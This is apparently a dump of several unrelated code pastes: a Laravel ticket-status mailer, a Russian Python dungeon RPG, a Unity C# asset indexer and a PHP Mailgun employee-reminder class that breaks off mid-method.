            </div>
            <div class=""o_hide-xs"" style=""font-size: 64px; line-height: 64px; height: 64px;"">&nbsp; </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
  </body>
"
tFNHEH1W,Untitled,Ugly_Urchin,PHP,Thursday 13th of July 2023 07:22:30 AM CDT,"<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;
use App\Contracts\Constants;

class StatusChanged extends Mailable
{
    use Queueable, SerializesModels;

    /**
     * Create a new message instance.
     *
     * @return void
     */ 
    public function __construct($ticket, $user , $type, $status)
    {
        $this->ticket = $ticket;
        $this->type = $type;
        $this->status = $status;
        $this->user = $user;
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {

        $ticketDetails = [
            'ticketId' => $this->ticket->id,
            'quantity' => $this->ticket->quantity,
            'section' => $this->ticket->section,
            'platform' => $this->ticket->delivery_option == 1 ? 'AXS' : 'Ticket Master',
            'row' => $this->ticket->row,
            'price_actual' => number_format($this->ticket->price_actual, 2),
            'event_name' => $this->ticket->getEvent->title,
            'month' => $this->ticket->getEvent->date_time_local ? dateTimeFormat($this->ticket->getEvent->date_time_local, 'M') : dateTimeFormat($this->ticket->getEvent->date_time, 'M'),
            'date' => $this->ticket->getEvent->date_time_local ? dateTimeFormat($this->ticket->getEvent->date_time_local, 'd') : dateTimeFormat($this->ticket->getEvent->date_time, 'd'),
            'year' => $this->ticket->getEvent->date_time_local ? dateTimeFormat($this->ticket->getEvent->date_time_local, 'Y') : dateTimeFormat($this->ticket->getEvent->date_time, 'Y'),
            'event_date' => $this->ticket->getEvent->date_time_local ? dateTimeFormat($this->ticket->getEvent->date_time_local, 'M d, Y') . ' @ ' . dateTimeFormat($this->ticket->getEvent->date_time_local, 'g:ia') : dateTimeFormat($this->ticket->getEvent->date_time, 'M d, Y') . ' @ ' . dateTimeFormat($this->ticket->getEvent->date_time, 'g:ia'),
            'event_time' => dateTimeFormat($this->ticket->getEvent->date_time, 'g:ia'),
            'city' => $this->ticket->getEvent->venue->city,
            'venue' => $this->ticket->getEvent->venue->name,
        ];

        $userDetails = [
            'first_name' => $this->user->first_name,
            'last_name' => $this->user->last_name,
            'image' => $this->user->image,
        ];

        if ($this->type == 'buyer') {
           
        
            switch ($this->status) {

                case Constants::TICKET_RECEIVED_BUYER_WAITING_FOR_TICKETS:
                    $subject = __('email_buyer.tickets_received_subject',['event_name'=>$ticketDetails['event_name'],'event_date'=>$ticketDetails['event_date'],'platform'=>$ticketDetails['platform']]);
                    $template = 'email.buyer.ticket_received';
                    break;

                case Constants::SELLER_WAITING_FOR_PAYMENT_TICKET_TRANSFERRED_TO_BUYER:
                    $subject = 'Your tickets are now available in your '.$ticketDetails['platform'].' account';
                    $template = 'email.buyer.ticket_waiting_for_payment';
                    break;

                case Constants::EVENT_CANCELLED_BUYER_REFUNDED:
                    $subject = 'An event you purchased tickets for has been cancelled';
                    $template = 'email.buyer.ticket_event_cancelled';
                    break;

                case Constants::BUYER_CANCELLED_REFUND_INITIATED:
                    $subject = 'Your refund has been initiated';
                    $template = 'email.buyer.ticket_buyer_cancelled';
                    break;

                case Constants::SELLER_CANCELLED_REFUND_INITIATED:
                    $subject = 'Bad news. The seller canceled the transaction';
                    $template = 'email.buyer.ticket_seller_cancelled';
                    break;

                case Constants::TRANSACTION_HELD:
                    $subject = 'This transaction is currently on hold';
                    //$template = 'email.buyer.ticket_hold';
                    $template = 'emailTemplateBuyer';
                    break;
            }
        } elseif ($this->type == 'seller') {

            switch ($this->status) {

                case Constants::TICKET_RECEIVED_BUYER_WAITING_FOR_TICKETS:
                    $subject = __('email_seller.tickets_received_subject',['event_date'=>$ticketDetails['event_date'],'event_name'=>$ticketDetails['event_name']]);
                    $template = 'email.seller.ticket_received';
                    break;

                case Constants::SELLER_WAITING_FOR_PAYMENT_TICKET_TRANSFERRED_TO_BUYER:
                    $subject = __('email_seller.tickets_sent_to_buyer_subject',['event_name'=>$ticketDetails['event_name']]);
                    $template = 'email.seller.ticket_waiting_for_payment';
                    break;

                case Constants::SELLER_PAID:
                    $subject = __('email_seller.payment_sent_subject');
                    $template = 'email.seller.ticket_seller_paid';
                    break;  

                case Constants::EVENT_CANCELLED_BUYER_REFUNDED:
                    $subject = __('email_seller.event_cancelled_subject');
                    $template = 'email.seller.ticket_event_cancelled';
                    break;

                case Constants::BUYER_CANCELLED_REFUND_INITIATED:
                    $subject = __('email_seller.txn_cancelled_by_buyer_subject');
                    $template = 'email.seller.ticket_buyer_cancelled';
                    break;

                case Constants::SELLER_CANCELLED_REFUND_INITIATED:
                    $subject = __('email_seller.txn_cancelled_by_seller_subject');
                    $template = 'email.seller.ticket_seller_cancelled';
                    break;

                // there are multiple emails of hold status. need to investigate.
                case Constants::TRANSACTION_HELD:
                    $subject = 'This transaction is on hold';
                    //$template = 'email.seller.ticket_hold';
                    $template = 'emailTemplateSeller';
                    break;

                // there are multiple emails of below status. need to investigate.
                case Constants::TICKET_RECIEVED_AVAILABLE_FOR_SALE:
                    $subject = 'TicketRef has received your tickets';
                    $template = 'email.seller.ticket_available_for_sale';
                    break;

                // there are multiple emails of below status. need to investigate.
                case Constants::SELLER_CANCELLED_LISTING_NOT_SOLD:
                    $subject = 'Your listing has been removed';
                    $template = 'email.seller.ticket_listing_not_sold';
                    break;
            }
        }


        return $this->subject($subject)
            ->view($template)
            ->with([
                'ticketId' => $this->ticket->id,
                'ticket' => $ticketDetails,
                'user' => $userDetails,               
            ]);
    }
}
"
YYCKvc3G,№20. RPG: Подземелья,Chl_Snt,Python,Thursday 13th of July 2023 07:16:53 AM CDT,"import random
import time


class Player:
    def __init__(self, name, hp, damage):
        self.name = name
        self.hp = hp
        self.damage = damage

    def attack(self, victim):
        victim.hp -= self.damage
        print(f""Ты нанёс врагу {self.damage} урона. Теперь у него {victim.hp} здоровья."")
        if victim.hp <= 0:
            print(f""{victim.name} повержен!"")
            return False
        else:
            return True


class Enemy:
    races = {
        ""Слизняк"": (10, 10),
        ""Волк"": (25, 20),
        ""Орк"": (50, 45),
        ""Группа гоблинов"": (120, 25),
        ""Оборотень"": (150, 50)
    }

    def __init__(self):
        self.name = random.choice(list(self.races.keys()))
        self.hp = self.races[self.name][0]
        self.damage = self.races[self.name][1]

    def attack(self, victim):
        victim.hp -= self.damage
        print(f""{self.name} нанёс тебе {self.damage} урона. Теперь у тебя {victim.hp} здоровья."")
        if victim.hp <= 0:
            exit(print(""ПОТРАЧЕНО!""))
        else:
            return True


def create_hero(name, race, prof):
    hp = 100
    dmg = 25
    hp *= races[race][0]
    hp *= profs[prof][0]
    dmg *= races[race][1]
    dmg *= profs[prof][1]
    hero = Player(name, hp, dmg)
    return hero


def start():
    enemy = Enemy()
    print(f""Тебе встретился {enemy.name}. ❤️: {enemy.hp}, ⚔️: {enemy.damage}"")
    print(""Нападать?"")
    answer = input(""Да/Нет: "").lower()
    if answer == ""да"":
        fight(enemy)
    else:
        luck = random.randint(1, 100)
        if luck in range(40):
            print(""Ты смог незаметно ускользнуть и пойти дальше!"")
            time.sleep(2)
            start()
        else:
            print(""Ты НЕ смог незаметно ускользнуть!"")
            time.sleep(2)
            enemy.attack(hero)
            fight(enemy)


def fight(victim):
    result = hero.attack(victim)
    time.sleep(1)
    if result:
        victim.attack(hero)
        time.sleep(1)
        fight(victim)
    else:
        start()


name = input(""Введи своё имя: "")

races = {
    ""эльф"": (1.5, 1),
    ""гном"": (0.8, 1.2),
    ""человек"": (1, 1)
}

profs = {
    ""лучник"": (0.9, 2),
    ""щитоносец"": (2, 0.6),
    ""рыцарь"": (1.2, 1.2)
}

race = """"
prof = """"
while race not in tuple(races.keys()):
    print(f""Выбери расу: {tuple(races.keys())}"")
    race = input(""-> "").lower()

while prof not in tuple(profs.keys()):
    print(f""Выбери профессию: {tuple(profs.keys())}"")
    prof = input(""-> "").lower()

hero = create_hero(name, race, prof)
print(f""Здравствуй, герой с именем {hero.name}!\n""
      f""Твоё здоровье равно {hero.hp} ХП.\n""
      f""Твой урон равен {hero.damage} единицам.\n""
      f""Желаю удачи в приключениях, странник! ^_+"")
time.sleep(1)
start()
"
JqWBuP3H,ManagerListObject,JeCodeLeSoir,C#,Thursday 13th of July 2023 07:14:23 AM CDT,"using System;
using System.Collections.Generic;
using System.IO;
using UnityEditor;
using UnityEngine;

public static class ManagerListObject
{

    /* Dossier a créer 
     * --> Asset/Resources/ScriptObjects/Objects
     */
    /* Attention faut mettre MyObjectData dans un autre fichier Cs si non unity pas CONTENT ! */

    [CreateAssetMenu(fileName = ""MyObject"", menuName = ""ScriptableObjects/MyObject"", order = 1)]
    public class MyObjectData : ScriptableObject
    {
        public string text_name;
        public TypeObject type;
 
    }

    public enum TypeObject
    {
        None = -1,
        Player = 0,
        Enemy = 1,
        Bullet = 2,
        Item = 3,
        Effect = 4,
        UI = 5,
        Max = 6,
    }

    #if UNITY_EDITOR
        [CustomEditor(typeof(MyObjectData))]
        public class MyObjectDataEditor : Editor
        {
            public override void OnInspectorGUI()
            {
                base.OnInspectorGUI();

                MyObjectData myObjectData = (MyObjectData)target;

                if (GUILayout.Button(""Save""))
                {
                    string assetPath = AssetDatabase.GetAssetPath(myObjectData.GetInstanceID());
                    AssetDatabase.RenameAsset(assetPath, $""{myObjectData.text_name}_{(int)myObjectData.type}"");
                    AssetDatabase.SaveAssets();
                    AssetDatabase.Refresh();
                }

                if (GUILayout.Button(""Build""))
                {
                    ManagerListObject.Build();

                    Debug.Log(ManagerListObject.FindOne<ScriptableObject>(new FilterData { name = ""TEST"" }));
                }
            }

        }
    #endif

    public struct FilterData
    {
        public string name;
        public TypeObject type;

        public FilterData(string name = """", TypeObject type = TypeObject.None)
        {
            this.name = name;
            this.type = type;
        }
    }

    [System.Serializable]
    public struct MetaData
    {
        public string header;

        public string name;
        public TypeObject Type;
    }

    [System.Serializable]
    public struct MetaDatas
    {
        public MetaData[] metaDatas;
    }

#if UNITY_EDITOR
    public static void Build()
    {
        try
        {
            string[] files = Directory.GetFiles($""{Application.dataPath}/Resources/ScriptObjects/Objects"");
            
            List<MetaData> _metaDatas = new ();

            for (int i = 0; i < files.Length; i++)
            {
                FileInfo fileInfo = new FileInfo(files[i]);
                if (fileInfo.Extension == "".asset"")
                {
                    string name = fileInfo.Name.Replace(fileInfo.Extension, """");

                    string[] _metaData = name.Split(""_"");

                    MetaData data = new MetaData
                    {
                        header = name,
                        name = _metaData[0],
                        Type = (TypeObject)int.Parse(_metaData[1]),
                    };

                    _metaDatas.Add(data);
                }
            }

            string metaDatas_json = JsonUtility.ToJson(new MetaDatas { metaDatas = _metaDatas.ToArray() });

            File.WriteAllText($""{Application.dataPath}/Resources/ScriptObjects/Objects.json"", metaDatas_json);
        }
        catch (Exception ex)
        {
            Debug.LogError(ex.Message);
        }
    }
#endif
    
    public static T FindOne<T>(FilterData filterData) where T : ScriptableObject
    {
        TextAsset textAsset = Resources.Load<TextAsset>(""ScriptObjects/Objects"");
        MetaDatas metaDatas = JsonUtility.FromJson<MetaDatas>(textAsset.text);

        for (int i = 0; i < metaDatas.metaDatas.Length; i++)
        {
            bool filterOk = false;

            if (filterData.type != TypeObject.None)
                if (metaDatas.metaDatas[i].Type == filterData.type)
                    filterOk = true;

            if (filterData.name != string.Empty)
                if (metaDatas.metaDatas[i].name == filterData.name)
                    filterOk = true;

            if (filterOk)
                return Resources.Load<T>($""ScriptObjects/Objects/{metaDatas.metaDatas[i].header}"");
        }

        return Resources.Load<T>(""ScriptObjects/Objects/"");
    }

}
"
9eRG8cBv,Eminders.php,rivg26,PHP,Thursday 13th of July 2023 07:13:46 AM CDT,"<?php
namespace EMinders;

require_once dirname(__DIR__) . '/vendor/autoload.php';
require_once 'PrimarySender.php';

use Mailgun\Mailgun;
use MongoRegex;
use PrimarySender\PrimarySender;

class EMinders {

    public $db;
    public $current_udate;
    public $interval;
    public $ok;
    public $list;
    public $test_mode;
    public $test_email;
    public $employees_sent_eminders;

    public function __construct($db){
        $this->db = $db;
        
        // set eminder interval
        $this->current_udate = date('U') - 0;
        $this->interval = 86400 * 7;
    }


    public function getEmployerCourses($employer_id){
        $course_ids = [];
        $collection = $this->db->Course;
        $criteria = ['Company' => $employer_id - 0];
        $select = ['_id' => 0, 'CourseId' => 1];
        $cursor = $collection->find($criteria, $select);
        foreach($cursor as $document){
            array_push($course_ids, $document['CourseId'] - 0);
        }
        return $course_ids;
    }


    public function criteria($course_ids, $type){
        $criteria = [
            ['CourseID' => ['$in' => $course_ids]],
            ['Status' => ['$ne' => 'Archived']],
            ['Status' => ['$ne' => 'archived']],
            ['Status' => ['$ne' => 'Cancelled']],
            ['Status' => ['$ne' => 'cancelled']],
            ['Status' => ['$ne' => 'Deleted']],
            ['Status' => ['$ne' => 'deleted']],
            ['$or' => [
                ['UpToDate' => ['$ne' => 1]],
                ['EPostersUnviewed' => ['$gt' => 0]]
            ]],
            ['$or' => [
                ['UDateCreated' => ['$lte' => $this->current_udate - $this->interval]],
                ['UDateCreated' => ['$exists' => false]]
            ]],
            ['$or' => [
                ['EPosterAlertUDate' => ['$lte' => $this->current_udate - $this->interval]],
                ['EPosterAlertUDate' => ['$exists' => false]]
            ]]
        ];
        switch($type){
            case 1:
                array_push($criteria, ['$or' => [
                    ['EPosterEminderNumber' => ['$exists' => false]],
                    ['EPosterEminderNumber' => 0]
                ]]);
                break;
            case 2:
                array_push($criteria, ['EPosterEminderNumber' => 1]);
                break;
            case 3:
                array_push($criteria, ['$or' => [
                    ['EPosterEminderNumber' => 2],
                    ['EPosterEminderNumber' => 3]
                ]]);
                break;
            default:
        }
        return ['$and' => $criteria];
    }


    public function getEminderTypeEmployees($course_ids, $type, $size, $sort, $sort_dir){
        $current_udate = date('U') - 0;

        // get employee eminder info
        $employees = [];
        $collection = $this->db->CustomerCourses;
        $select = ['_id' => 1, 'CustomerID' => 1, 'EPosterAlertUDate' => 1, 'EPosterEminderNumber' => 1];
        $cursor = $collection->find($this->criteria($course_ids, $type), $select);
        $total_count = $cursor->count();
        $cursor = $cursor->sort(['EPosterAlertUDate' => 1])->limit($size);
        foreach($cursor as $document){
            $employees[$document['CustomerID']] = [
                'last_eminder' => isset($document['EPosterEminderNumber']) ? $document['EPosterEminderNumber'] : '-',
                'last_timestamp' => isset($document['EPosterAlertUDate']) ? date('Y-m-d h:i A T', $document['EPosterAlertUDate'] - 0) : '-'
            ];
        }

        // get employee ids
        $employee_ids = [];
        $x = array_keys($employees);
        for($i=0; $i<count($x); $i++){
            array_push($employee_ids, ""{$x[$i]}"");
        }

        // get employees
        $employees_sorted = [];
        $collection = $this->db->Customers;
        $criteria = ['ID' => ['$in' => $employee_ids]];
        $select = ['_id' => 1, 'ID' => 1, 'FirstName' => 1, 'MiddleName' => 1, 'LastName' => 1, 'EmailAddress' => 1];
        $cursor = $collection->find($criteria, $select);
        if($sort){
            $sort_dir = $sort_dir - 0 ? 1 : -1;
            switch($sort){
                case 'date_order_created':
                    $cursor = $cursor->sort(['_id'  => $sort_dir, 'LastName' => $sort_dir, 'FirstName' => $sort_dir]);
                    break;
                default:
                    $cursor = $cursor->sort(['LastName' => $sort_dir, 'FirstName' => $sort_dir]);
            }
        } else {
            $cursor = $cursor->sort(['LastName' => 1, 'FirstName' => 1]);
        }
        foreach($cursor as $document){
            $udate_created = $document['_id']->getTimeStamp() - 0;
            $minit = $document['MiddleName'] != '' ? ' ' . substr($document['MiddleName'], 0, 1) . '.' : '';
            $employee_name = $document['LastName'] . ', ' . $document['FirstName'] . $minit;
            $employees_sorted[$document['ID']] = [
                'name' => $employee_name,
                'email' => $document['EmailAddress'],
                'date_created' => date('Y-m-d', $udate_created - 0),
                'last_eminder' => $employees[$document['ID']]['last_eminder'],
                'last_timestamp' => $employees[$document['ID']]['last_timestamp']
            ];
        }
        $employees = $employees_sorted;
        /*
        foreach($cursor as $document){
            $minit = $document['MiddleName'] != '' ? ' ' . substr($document['MiddleName'], 0, 1) . '.' : '';
            $employee_name = $document['LastName'] . ', ' . $document['FirstName'] . $minit;
            $employees[$document['ID']]['name'] = $employee_name;
            $employees[$document['ID']]['email'] = $document['EmailAddress'];
            $udate_created = $document['_id']->getTimeStamp() - 0;
            $employees[$document['ID']]['date_created'] = date('Y-m-d', $udate_created - 0);
            $employees[$document['ID']]['udate_created'] = $udate_created;
        }
        */
        
        // reassemble employees list
        $list = [];
        foreach($employees as $employee_id => $details){
            array_push($list, [
                'id' => $employee_id,
                'name' => ucwords(strtolower($details['name'])),
                'email' => $details['email'],
                'last_eminder' => $details['last_eminder'],
                'last_timestamp' => $details['last_timestamp'],
                'date_created' => $details['date_created']
            ]);
        }
        return [
            'list' => $list,
            'total' => $total_count
        ];
    }


    public function loadEmployees($affiliate_id, $employer_id, $type, $size, $sort, $sort_dir){
        $user_id = isset($_SESSION['ntsi_eid']) ? $_SESSION['ntsi_eid'] - 0 : 0;
        if($user_id){
            if($size){
                $course_ids = $this->getEmployerCourses($employer_id);
                $employees = $this->getEminderTypeEmployees($course_ids, $type, $size, $sort, $sort_dir);
                return (object) ['ok' => 1, 'list' => $employees['list'], 'total' => $employees['total']];
            } else {
                return (object) ['ok' => 0, 'error' => 'Size error!'];
            }
        }
    }


    public function getEmailTemplate($affiliate_id, $employer_id, $type){

        // get email template for the employer
        $email_template_id = 0;
        $collection = $this->db->EmailTemplateApplieds;
        $criteria = ['$and' => [
            ['EmailTemplateTask' => 'eposter_employee_eminder' . $type],
            ['XType' => new MongoRegex(""/companies/i"")],
            ['$or' => [
                ['Xid' => $employer_id - 0],
                ['Xid' => ""{$employer_id}""]
            ]]]];
        $select = ['_id' => 0, 'EmailTemplateId' => 1];
        $document = $collection->findOne($criteria, $select);
        if($document){
            $email_template_id = $document['EmailTemplateId'] - 0;
        
        // get email template for affiliate if no email template is available from the employer
        } else {
            $criteria = ['$and' => [
                ['EmailTemplateTask' => 'eposter_employee_eminder' . $type],
                ['XType' => new MongoRegex(""/affiliates/i"")],
                ['Xid' => ""{$affiliate_id}""]]];
            $document = $collection->findOne($criteria, $select);
            if($document){
                $email_template_id = $document['EmailTemplateId'] - 0;
            }
        }
        if($email_template_id){

            // get email template
            $collection = $this->db->EmailTemplates;
            $criteria = ['EmailTemplateId' => $email_template_id];
            $select = ['_id' => 0, 'Subject' => 1, 'EmailBody' => 1];
            $document = $collection->findOne($criteria, $select);
            if($document){
                $subject = trim($document['Subject']);
                if($this->test_mode){
                    $subject .= ' (Testing: [orig_email])';
                }
                $email_template = [
                    'ok' => 1,
                    'id' => $email_template_id,
                    'subject' => $subject,
                    'body' => trim($document['EmailBody'])
                ];
                return (object) $email_template;
            
            // return error
            } else {
                return (object) ['ok' => 0, 'status' => 404, 'error' => 'Not Found', 'message' => 'No email template found for the employer/affiliate!'];
            }
        } else {
            return (object) ['ok' => 0, 'status' => 404, 'error' => 'Not Found', 'message' => 'No email template found for the employer/affiliate!'];
        }
    }


    // tag email template with mailgun-format recipient variables
    private function tagRecipientVariables($email_subject, $email_body){
        $tags = [
            '[email]' => '%recipient.email%',
	    '[orig_email]' => '%recipient.orig_email%',
            '[employee_id]' => '%recipient.employee_id%',
            '[first_name]' => '%recipient.first_name%',
            '[username]' => '%recipient.username%',
            '[employer_name]' => '%recipient.employer_name%',
            '[employer_admin_email]' => '%recipient.employer_admin_email%',
            '[employer_admin_name]' => '%recipient.employer_admin_name%'
        ];
        foreach($tags as $find => $replace){
            if(strstr($email_subject, $find)){
                $email_subject = str_replace($find, $replace, $email_subject);
            }
            if(strstr($email_body, $find)){
                $email_body = str_replace($find, $replace, $email_body);
            }
            
        }
        return (object) [
            'subject' => $email_subject,
            'body' => $email_body
        ];
    }



    private function getEmployeesData($employee_ids){

        // get employee info
        $emp_ids = [];
        $employees = [];
        $data = [];
        $dlnums = [];
        $collection = $this->db->Customers;
        $criteria = ['ID' => ['$in' => $employee_ids]];
        $select = ['_id' => 0, 'ID' => 1, 'DLNumber' => 1, 'FirstName' => 1, 'EmailAddress' => 1];
        $cursor = $collection->find($criteria, $select);
        foreach($cursor as $document){
            if($document['EmailAddress'] != ''){
                array_push($emp_ids, $document['ID']);
                if($this->test_mode){
                    $x = explode('@', $this->test_email);
                    $email = $x[0] . '+' . $document['ID'] . '@' . $x[1];
                } else {
                    $email = $document['EmailAddress'];
                }
                array_push($data, [
                    'employee_id' => $document['ID'],
                    'email' => $email,
		            'orig_email' => $document['EmailAddress'],
                    'dlnum' => $document['DLNumber'],
                    'first_name' => ucwords(strtolower($document['FirstName']))
                ]);
                array_push($dlnums, $document['DLNumber']);
            }
        }
        $this->employees_sent_eminders = $emp_ids;

        // get usernames
        $usernames = $this->getUserNames($dlnums);
        for($i=0; $i<count($data); $i++){
            $email = $data[$i]['email'];
            if(array_key_exists($email, $employees)){
                $x = explode('@', $email);
                $email = $x[0] . '+' . $data[$i]['employee_id'] . '@' . $x[1];
            }
            $employees[$email] = [
                'email' => $data[$i]['email'],
		'orig_email' => $data[$i]['orig_email'],
                'employee_id' => $data[$i]['employee_id'],
                'first_name' => $data[$i]['first_name'],
                'username' => $usernames[$data[$i]['dlnum']]
            ];
        }

        // return employees
        if($employees){
            return (object) ['ok' => 1, 'employees' => $employees];
        } else {
            return ['ok' => 0, 'status' => 400, 'error' => 'Not Found', 'message' => 'Employees not found!'];
        }
    }


    private function getUserNames($dlnums){
        $usernames = [];
        $collection = $this->db->Customer;
        $criteria = ['DLNumber' => ['$in' => $dlnums]];
        $select = ['_id' => 0, 'DLNumber' => 1, 'UserName' => 1];
        $cursor = $collection->find($criteria, $select);
        foreach($cursor as $document){
            $usernames[$document['DLNumber']] = $document['UserName'];
        }
        return $usernames;
    }


    private function getEmployerName($employer_id){
        $collection = $this->db->Company;
        $criteria = ['CompanyId' => $employer_id - 0];
        $select = ['_id' => 0, 'CompanyName' => 1];
        $document = $collection->findOne($criteria, $select);
        if($document){
            return (object) ['ok' => 1, 'employer_name' => $document['CompanyName']];
        } else {
            return ['ok' => 0, 'status' => 400, 'error' => 'Not Found', 'message' => 'Employer not found!'];
        }
    }


    private function getEmployerAdmin($employer_id){
        $primary_sender = new PrimarySender($this->db);
        $criteria_primary_sender = $primary_sender->criteria_primary_sender;
        // get employer admin email
        $collection = $this->db->UserAccount;
        $criteria = ['$and' => [
            ['Company' => $employer_id - 0],
            ['$or' => [
                ['Designation' => new MongoRegex(""/company admin/i"")],
                ['Designation' => new MongoRegex(""/employer admin/i"")],
                ['Designation' => new MongoRegex(""/eposter admin/i"")]
            ]],
            $criteria_primary_sender
        ]];
        $select = ['_id' => 0, 'EmpId' => 1, 'EmailAddress' => 1];
        $document = $collection->findOne($criteria, $select);
        if($document){
            $emp_id = $document['EmpId'] - 0;
            $employer_admin_email = $document['EmailAddress'];

            // get employer admin name
            $collection = $this->db->Employee;
            $criteria = ['EmpId' => $emp_id];
            $select = ['_id' => 0, 'FirstName' => 1, 'MiddleName' => 1, 'LastName' => 1, 'Prefix' => 1];
            $document = $collection->findOne($criteria, $select);
            if($document){
                $minit = $document['MiddleName'] != '' ? ' ' . substr($document['MiddleName'], 0, 1) . '. ' : ' ';
                $suffix = $document['Prefix'] != '' ? ' ' . $document['Prefix'] : '';
                $employer_admin_name = $document['FirstName'] . $minit . $document['LastName'] . $suffix; 

                // return employer admin
                return (object) [
                    'ok' => 1, 
                    'employer_admin_name' => $employer_admin_name, 
                    'employer_admin_email' => $employer_admin_email
                ];

            // return error
            } else {
                return ['ok' => 0, 'status' => 400, 'error' => 'Not Found', 'message' => 'Employer Admin not found!'];
            }
        } else {
            return ['ok' => 0, 'status' => 400, 'error' => 'Not Found', 'message' => 'Employer Admin not found!'];
        }
    }



    private function getEmailData($employer_id, $employee_ids){

        // get employer name
        $result = $this->getEmployerName($employer_id);
        if($result->ok){
            $employer_name = $result->employer_name;

            // get employer admin
            $result = $this->getEmployerAdmin($employer_id);
            if($result->ok){
                $employer_admin_name = $result->employer_admin_name;
                $employer_admin_email = $result->employer_admin_email;
            
                // get employee data
                $result = $this->getEmployeesData($employee_ids);
                if($result->ok){
                    $email_data = $result->employees;
                    foreach($email_data as $email => $data){
                        $data['employer_name'] = $employer_name;
                        $data['employer_admin_name'] = $employer_admin_name;
                        $data['employer_admin_email'] = $employer_admin_email;
                        $email_data[$email] = $data;
                    }
                    return (object) ['ok' => 1, 'email_data' => $email_data];
                } else {
                    return $result;
                }
            } else {
                return $result;
            }
        } else {
            return $result;
        }
    }



    private function getDefaultMailgun(){
        include_once dirname(__DIR__) . '/constants/emailer.php';
        return (object) [
            'domain' => EPOSTER_MAILGUN_DOMAIN,
            'api_key' => EPOSTER_MAILGUN_API_KEY,
            'emailer' => EPOSTER_MAILGUN_EMAILER
        ];
    }


    private function getEmployerMailgun($employer_id){
        $criteria = ['CompanyId' => $employer_id - 0];
        $select = ['_id' => 0, 'MailgunDomain' => 1, 'MailgunAPIKey' => 1, 'MailgunEmail' => 1, 'MailgunEmailerName' => 1];
        $collection = $this->db->Company;
        $document = $collection->findOne($criteria, $select);
        if($document){
            if($document['MailgunDomain'] AND $document['MailgunAPIKey'] AND $document['MailgunEmail']){
                $emailer_name = $document['MailgunEmailerName'] ? $document['MailgunEmailerName'] . ' ' : '';
                return (object) [
                    'domain' => $document['MailgunDomain'],
                    'api_key' => $document['MailgunAPIKey'],
                    'emailer' => $emailer_name . $document['MailgunEmail']
                ];
            }
        }
    }
    

    private function getAffiliateMailgun($affiliate_id){
        $criteria = ['AffiliateId' => $affiliate_id - 0];
        $select = ['_id' => 0, 'MailgunDomain' => 1, 'MailgunAPIKey' => 1, 'MailgunEmail' => 1, 'MailgunEmailerName' => 1];
        $collection = $this->db->Affiliate;
        $document = $collection->findOne($criteria, $select);
        if($document){
            if($document['MailgunDomain'] AND $document['MailgunAPIKey'] AND $document['MailgunEmail']){
                $emailer_name = $document['MailgunEmailerName'] ? $document['MailgunEmailerName'] . ' ' : '';
                return (object) [
                    'domain' => $document['MailgunDomain'],
                    'api_key' => $document['MailgunAPIKey'],
                    'emailer' => $emailer_name . $document['MailgunEmail']
                ];
            }
        }
    }


    private function getMailgunCredentials($affiliate_id, $employer_id){
        $mailgun_credentials = $this->getEmployerMailgun($employer_id);
        if(!$mailgun_credentials){
            $mailgun_credentials = $this->getAffiliateMailgun($affiliate_id);
            if(!$mailgun_credentials){
                return $this->getDefaultMailgun();
            } else {
                return $mailgun_credentials;
            }
        } else {
            return $mailgun_credentials;
        }
    }


    private function markEmployeesSentOutEminders($type){
        if(!$this->test_mode){
                $collection = $this->db->CustomerCourses;
                $criteria = ['CustomerID' => ['$in' => $this->employees_sent_eminders]];
                $update = [
                        'EPosterAlertUDate' => date('U') - 0,
                        'EPosterEminderNumber' => $type
                ];
                $collection->update($criteria, ['$set' => $update], ['multiple' => true]);
        }
        return $this->employees_sent_eminders;
    }


    private function logEminders($requested_count, $type, $manual_send_id){
        $collection = $this->db->EminderLogs;
        $criteria = ['ManualSendID' => $manual_send_id];
        $document = $collection->findOne($criteria);
        if(!$document){
            $document = [
                'Timestamp' => date('U') - 0,
                'BatchesCount' => 1,
                'EminderNumber' => $type,
                'NotifiedEmployeesCount' => count($this->employees_sent_eminders),
                'NonCompliantEmployees' => $requested_count,
                'CronjobId' => $type . '_m_' . date('U'),
                'EmailedEmployees' => implode('|', $this->employees_sent_eminders),
                'TestMode' => $this->test_mode,
                'ManualSendID' => $manual_send_id
            ];
            if($this->test_mode){
                $document['TestEmail'] = $this->test_email;
            }
            $collection->insert($document);
        } else {
            $batches_count = $document['BatchesCount'];
            $non_compliant_employees = $document['NonCompliantEmployees'] - 0;
            $notified_employees_count = $document['NotifiedEmployeesCount'] - 0;
            $emailed_employees = explode('|', $document['EmailedEmployees']);
            $update = [
                'Timestamp' => date('U') - 0,
                'BatchesCount' => $batches_count + 1,
                'CronjobId' => $type . '_m_' . date('U'),
                'NotifiedEmployeesCount' => $notified_employees_count + count($this->employees_sent_eminders),
                'NonCompliantEmployees' => $non_compliant_employees + $requested_count,
                'EmailedEmployees' => implode('|', array_merge($emailed_employees, $this->employees_sent_eminders))
            ];
            $collection->update($criteria, ['$set' => $update]);
        }
    }


    public function send($manual_send_id, $affiliate_id, $employer_id, $type, $employee_ids, $is_testing=0, $test_email=''){
        $user_id = isset($_SESSION['ntsi_eid']) ? $_SESSION['ntsi_eid'] - 0 : 0;
        if($user_id){
            $this->test_mode = $is_testing;
            $this->test_email = $test_email;

            // get email data
            $result = $this->getEmailData($employer_id, $employee_ids);
            if($result->ok){
                $email_data = $result->email_data;
                $batch_emails = array_keys($email_data);

                // get email template
                $result = $this->getEmailTemplate($affiliate_id, $employer_id, $type);
                if($result->ok){

                    // reformat tags with mailgun's recipient variables
                    $formatted = $this->tagRecipientVariables($result->subject, $result->body);
                    $email_subject = $formatted->subject;
                    $email_body = $formatted->body;

                    // get mailgun credentials
                    $credentials = $this->getMailgunCredentials($affiliate_id, $employer_id);

                    // mailgun batch sending
                    $mailgun = new Mailgun($credentials->api_key);
                    $result = $mailgun->sendMessage($credentials->domain, [
                        'from' => $credentials->emailer,
                        'to' => $batch_emails,
                        'subject' => $email_subject,
                        'html' => $email_body,
                        'recipient-variables' => json_encode($email_data)
                    ]);
                    if($result->http_response_code == 200){

                        // mark employees sent out with eminders successfully
                        $this->markEmployeesSentOutEminders($type);

                        // log eminders
                        $this->logEminders(count($employee_ids), $type, $manual_send_id);

                        // return finished
                        return (object) ['ok' => 1, 'employee_ids' => $this->employees_sent_eminders];
                        
                    // return error
                    } else {
